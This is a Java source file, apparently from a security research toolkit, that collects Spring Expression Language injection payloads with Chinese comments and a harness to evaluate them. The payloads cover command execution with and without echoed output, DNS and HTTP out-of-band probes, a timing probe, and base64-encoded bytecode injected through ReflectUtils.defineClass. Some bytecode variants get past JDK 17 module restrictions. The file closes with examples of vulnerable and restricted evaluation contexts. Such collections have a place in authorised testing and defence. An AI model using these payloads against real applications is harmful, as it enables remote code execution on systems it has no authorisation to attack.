package com.ppp.spel;

import org.springframework.context.expression.MethodBasedEvaluationContext;
import org.springframework.expression.EvaluationContext;
import org.springframework.expression.Expression;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.SimpleEvaluationContext;
import org.springframework.expression.spel.support.StandardEvaluationContext;

/**
 * @author Whoopsunix
 */
public class SPELAttack {
    public static void main(String[] args) {
        /**
         * 命令执行
         */
        String version = "{T(java.lang.System).getProperty('java.version')}";
        // 无回显
        String runtime = "T(java.lang.Runtime).getRuntime().exec('open -a Calculator.app')";
        // 回显
        String runtimeEcho = "new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('ifconfig').getInputStream()).useDelimiter(\"\\\\A\").next()";
        String processBuilderEcho = "{new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder(\"bash\", \"-c\", \"whoami\").start().getInputStream(), \"gbk\")).readLine()}";

        /**
         * 探测
         */
        String DNSLOG = "T(java.net.InetAddress).getByName('DNSLOG')";
        String HTTPLOG = "new java.net.URL('http://host').getContent()";
        String HTTPLOG2 = "new org.springframework.web.client.RestTemplate().headForHeaders('http://host')";
        // 延时
        String sleep = "T(java.lang.Thread).sleep(10000)";

        /**
         * 类加载
         */
        // sun.misc.BASE64Decoder
        String classLoad1 = "{T(org.springframework.cglib.core.ReflectUtils).defineClass('org.example.Exec',new sun.misc.BASE64Decoder().decodeBuffer('yv66vgAAADQAMgoACwAZCQAaABsIABwKAB0AHgoAHwAgCAAhCgAfACIHACMIACQHACUHACYBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEkxvcmcvZXhhbXBsZS9FeGVjOwEADVN0YWNrTWFwVGFibGUHACUHACMBAAg8Y2xpbml0PgEAClNvdXJjZUZpbGUBAAlFeGVjLmphdmEMAAwADQcAJwwAKAApAQAERXhlYwcAKgwAKwAsBwAtDAAuAC8BABZvcGVuIC1hIENhbGN1bGF0b3IuYXBwDAAwADEBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQALc3RhdGljIEV4ZWMBABBvcmcvZXhhbXBsZS9FeGVjAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAKAAsAAAAAAAIAAQAMAA0AAQAOAAAAdgACAAIAAAAaKrcAAbIAAhIDtgAEuAAFEga2AAdXpwAETLEAAQAEABUAGAAIAAMADwAAABoABgAAAAcABAAJAAwACgAVAAwAGAALABkADQAQAAAADAABAAAAGgARABIAAAATAAAAEAAC/wAYAAEHABQAAQcAFQAACAAWAA0AAQAOAAAAWwACAAEAAAAWsgACEgm2AAS4AAUSBrYAB1enAARLsQABAAAAEQAUAAgAAwAPAAAAFgAFAAAAEQAIABIAEQAUABQAEwAVABUAEAAAAAIAAAATAAAABwACVAcAFQAAAQAXAAAAAgAY'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader()))}";
        String classLoad2 = "{T(org.springframework.cglib.core.ReflectUtils).defineClass('org.example.Exec',T(java.util.Base64).getDecoder().decode('yv66vgAAADQAMgoACwAZCQAaABsIABwKAB0AHgoAHwAgCAAhCgAfACIHACMIACQHACUHACYBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEkxvcmcvZXhhbXBsZS9FeGVjOwEADVN0YWNrTWFwVGFibGUHACUHACMBAAg8Y2xpbml0PgEAClNvdXJjZUZpbGUBAAlFeGVjLmphdmEMAAwADQcAJwwAKAApAQAERXhlYwcAKgwAKwAsBwAtDAAuAC8BABZvcGVuIC1hIENhbGN1bGF0b3IuYXBwDAAwADEBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQALc3RhdGljIEV4ZWMBABBvcmcvZXhhbXBsZS9FeGVjAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAKAAsAAAAAAAIAAQAMAA0AAQAOAAAAdgACAAIAAAAaKrcAAbIAAhIDtgAEuAAFEga2AAdXpwAETLEAAQAEABUAGAAIAAMADwAAABoABgAAAAcABAAJAAwACgAVAAwAGAALABkADQAQAAAADAABAAAAGgARABIAAAATAAAAEAAC/wAYAAEHABQAAQcAFQAACAAWAA0AAQAOAAAAWwACAAEAAAAWsgACEgm2AAS4AAUSBrYAB1enAARLsQABAAAAEQAUAAgAAwAPAAAAFgAFAAAAEQAIABIAEQAUABQAEwAVABUAEAAAAAIAAAATAAAABwACVAcAFQAAAQAXAAAAAgAY'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader()))}";
        classLoad2 = "{T(org.springframework.cglib.core.ReflectUtils).defineClass('org.example.Exec',T(java.util.Base64).getDecoder().decode('yv66vgAAADQAMgoACwAZCQAaABsIABwKAB0AHgoAHwAgCAAhCgAfACIHACMIACQHACUHACYBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEkxvcmcvZXhhbXBsZS9FeGVjOwEADVN0YWNrTWFwVGFibGUHACUHACMBAAg8Y2xpbml0PgEAClNvdXJjZUZpbGUBAAlFeGVjLmphdmEMAAwADQcAJwwAKAApAQAERXhlYwcAKgwAKwAsBwAtDAAuAC8BABZvcGVuIC1hIENhbGN1bGF0b3IuYXBwDAAwADEBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQALc3RhdGljIEV4ZWMBABBvcmcvZXhhbXBsZS9FeGVjAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAKAAsAAAAAAAIAAQAMAA0AAQAOAAAAdgACAAIAAAAaKrcAAbIAAhIDtgAEuAAFEga2AAdXpwAETLEAAQAEABUAGAAIAAMADwAAABoABgAAAAcABAAJAAwACgAVAAwAGAALABkADQAQAAAADAABAAAAGgARABIAAAATAAAAEAAC/wAYAAEHABQAAQcAFQAACAAWAA0AAQAOAAAAWwACAAEAAAAWsgACEgm2AAS4AAUSBrYAB1enAARLsQABAAAAEQAUAAgAAwAPAAAAFgAFAAAAEQAIABIAEQAUABQAEwAVABUAEAAAAAIAAAATAAAABwACVAcAFQAAAQAXAAAAAgAY'),T(java.lang.Thread).currentThread().getContextClassLoader(), null, T(java.lang.Class).forName(\"org.springframework.expression.ExpressionParser\"))}";

        /**
         * 高版本利用
         */
        // (java.lang.Thread).currentThread().getContextClassLoader()
        // 命名模块
        String classLoadJDK17_1 = "{T(org.springframework.cglib.core.ReflectUtils).defineClass('org.springframework.expression.Test',T(java.util.Base64).getDecoder().decode('yv66vgAAADQALwoACgAXCQAYABkIABoKABsAHAoAHQAeCAAfCgAdACAHACEHACIHACMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUxvcmcvc3ByaW5nZnJhbWV3b3JrL2V4cHJlc3Npb24vVGVzdDsBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUHACEBAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAALAAwHACQMACUAJgEAC3N0YXRpYyBFeGVjBwAnDAAoACkHACoMACsALAEAFm9wZW4gLWEgQ2FsY3VsYXRvci5hcHAMAC0ALgEAE2phdmEvbGFuZy9FeGNlcHRpb24BACNvcmcvc3ByaW5nZnJhbWV3b3JrL2V4cHJlc3Npb24vVGVzdAEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEACQAKAAAAAAACAAEACwAMAAEADQAAAC8AAQABAAAABSq3AAGxAAAAAgAOAAAABgABAAAABgAPAAAADAABAAAABQAQABEAAAAIABIADAABAA0AAABbAAIAAQAAABayAAISA7YABLgABRIGtgAHV6cABEuxAAEAAAARABQACAADAA4AAAAWAAUAAAAJAAgACgARAAwAFAALABUADQAPAAAAAgAAABMAAAAHAAJUBwAUAAABABUAAAACABY='),T(java.lang.Thread).currentThread().getContextClassLoader(), null, T(java.lang.Class).forName(\"org.springframework.expression.ExpressionParser\"))}";

        // (java.lang.ClassLoader).getSystemClassLoader()
        String classLoadJDK17_2 = "{T(org.springframework.cglib.core.ReflectUtils).defineClass('org.springframework.expression.Test',T(java.util.Base64).getDecoder().decode('yv66vgAAADQALwoACgAXCQAYABkIABoKABsAHAoAHQAeCAAfCgAdACAHACEHACIHACMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUxvcmcvc3ByaW5nZnJhbWV3b3JrL2V4cHJlc3Npb24vVGVzdDsBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUHACEBAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAALAAwHACQMACUAJgEAC3N0YXRpYyBFeGVjBwAnDAAoACkHACoMACsALAEAFm9wZW4gLWEgQ2FsY3VsYXRvci5hcHAMAC0ALgEAE2phdmEvbGFuZy9FeGNlcHRpb24BACNvcmcvc3ByaW5nZnJhbWV3b3JrL2V4cHJlc3Npb24vVGVzdAEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEACQAKAAAAAAACAAEACwAMAAEADQAAAC8AAQABAAAABSq3AAGxAAAAAgAOAAAABgABAAAABgAPAAAADAABAAAABQAQABEAAAAIABIADAABAA0AAABbAAIAAQAAABayAAISA7YABLgABRIGtgAHV6cABEuxAAEAAAARABQACAADAA4AAAAWAAUAAAAJAAgACgARAAwAFAALABUADQAPAAAAAgAAABMAAAAHAAJUBwAUAAABABUAAAACABY='),T(java.lang.ClassLoader).getSystemClassLoader(), null, T(java.lang.Class).forName(\"org.springframework.expression.ExpressionParser\"))}";


//        Object obj = eval(classLoadJDK17_1);
//        System.out.println(obj);


//        // 添加 module 后二次加载 unnamed module 报错调试
//        String test1 = "{T(org.springframework.cglib.core.ReflectUtils).defineClass('org.springframework.expression.Test3',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAADQAfAoAFAA7CQA8AD0IAD4KAD8AQAoAQQBCCABDCgBBAEQHAEUIAEYKABAARwgASAoAEABJCgBKAEsKAEoATAcATQcATggATwoAEABQCgBRAEsHAFIKAFEAUwcAVAgAMgoADwBVCABWCQBXAFgKABAAWQoAVwBaCgAWAFsKABYAOwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAmTG9yZy9zcHJpbmdmcmFtZXdvcmsvZXhwcmVzc2lvbi9UZXN0MzsBAA1TdGFja01hcFRhYmxlBwBUBwBFAQAJYWRkTW9kdWxlAQALdW5zYWZlQ2xhc3MBABFMamF2YS9sYW5nL0NsYXNzOwEAC3Vuc2FmZUZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABnVuc2FmZQEAEUxzdW4vbWlzYy9VbnNhZmU7AQAGbWV0aG9kAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAZtb2R1bGUBABJMamF2YS9sYW5nL09iamVjdDsBAANjbHMBAAZvZmZzZXQBAAFKAQAVZ2V0QW5kU2V0T2JqZWN0TWV0aG9kAQAIPGNsaW5pdD4BAApTb3VyY2VGaWxlAQAKVGVzdDMuamF2YQwAHwAgBwBcDABdAF4BAARFeGVjBwBfDABgAGEHAGIMAGMAZAEAFm9wZW4gLWEgQ2FsY3VsYXRvci5hcHAMAGUAZgEAE2phdmEvbGFuZy9FeGNlcHRpb24BAA9zdW4ubWlzYy5VbnNhZmUMAGcAaAEACXRoZVVuc2FmZQwAaQBqBwBrDABsAG0MAG4AbwEAD3N1bi9taXNjL1Vuc2FmZQEAD2phdmEvbGFuZy9DbGFzcwEACWdldE1vZHVsZQwAcABxBwByAQAQamF2YS9sYW5nL09iamVjdAwAcwB0AQAkb3JnL3NwcmluZ2ZyYW1ld29yay9leHByZXNzaW9uL1Rlc3QzDAB1AHYBAA9nZXRBbmRTZXRPYmplY3QHAHcMAHgAKwwAeQBxDAB6AHsMACkAIAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABFvYmplY3RGaWVsZE9mZnNldAEAHChMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7KUoBAA5qYXZhL2xhbmcvTG9uZwEABFRZUEUBAAlnZXRNZXRob2QBAAd2YWx1ZU9mAQATKEopTGphdmEvbGFuZy9Mb25nOwAhABYAFAAAAAAAAwABAB8AIAABACEAAAB2AAIAAgAAABoqtwABsgACEgO2AAS4AAUSBrYAB1enAARMsQABAAQAFQAYAAgAAwAiAAAAGgAGAAAADAAEAA4ADAAPABUAEQAYABAAGQASACMAAAAMAAEAAAAaACQAJQAAACYAAAAQAAL/ABgAAQcAJwABBwAoAAAJACkAIAABACEAAAFMAAcACQAAAI0SCbgACksqEgu2AAxMKwS2AA0rAbYADsAAD00SEBIRA70AELYAEk4tBLYAEy0SFAO9ABS2ABU6BBIWOgUsEhASF7YADLYAGDcGKhIZBr0AEFkDEhRTWQSyABpTWQUSFFO2ABs6CBkIBLYAExkILAa9ABRZAxkFU1kEFga4ABxTWQUZBFO2ABVXpwAES7EAAQAAAIgAiwAIAAMAIgAAAD4ADwAAABsABgAcAA0AHQASAB4AGwAfACcAIAAsACEAOAAiADwAIwBJACQAZQAlAGsAJgCIACkAiwAnAIwAKgAjAAAAUgAIAAYAggAqACsAAAANAHsALAAtAAEAGwBtAC4ALwACACcAYQAwADEAAwA4AFAAMgAzAAQAPABMADQAKwAFAEkAPwA1ADYABgBlACMANwAxAAgAJgAAAAkAAvcAiwcAKAAACAA4ACAAAQAhAAAALAACAAAAAAAMuAAduwAWWbcAHlexAAAAAQAiAAAADgADAAAAFQADABYACwAXAAEAOQAAAAIAOg=='),T(java.lang.Thread).currentThread().getContextClassLoader(), null, T(java.lang.Class).forName('org.springframework.expression.ExpressionParser'))}";
//        String load = "{T(java.lang.Thread).currentThread().getContextClassLoader().loadClass('org.springframework.expression.Test3').newInstance()}";
//        eval(test1);
//        eval(load);

        eval(classLoad2);

    }

    public static Object eval(String payload) {
        return new SpelExpressionParser().parseExpression(payload).getValue();
    }

    /**
     * 默认也是用的 StandardEvaluationContext
     */
    public static Object spelStandardEvaluationContext(String payload) {
        EvaluationContext evaluationContext = new StandardEvaluationContext();
        return new SpelExpressionParser().parseExpression(payload).getValue(evaluationContext);
    }

    public static Object spelMethodBasedEvaluationContext(String payload) {

        EvaluationContext evaluationContext = new MethodBasedEvaluationContext(new User(), null, null, null);
        return new SpelExpressionParser().parseExpression(payload).getValue(evaluationContext);
    }

    /**
     * safe
     */

    /**
     * SimpleEvaluationContext
     */
    public static Object spelSimpleEvaluationContext(String payload) {
        EvaluationContext evaluationContext = SimpleEvaluationContext.forReadOnlyDataBinding().build();
        return new SpelExpressionParser().parseExpression(payload).getValue(evaluationContext);
    }

    public static Object spelSafe(String payload) {
        StandardEvaluationContext context = new StandardEvaluationContext();
        context.setVariable("payload", payload);
        Expression expression = new SpelExpressionParser().parseExpression("#payload");
        return expression.getValue(context);
    }
}
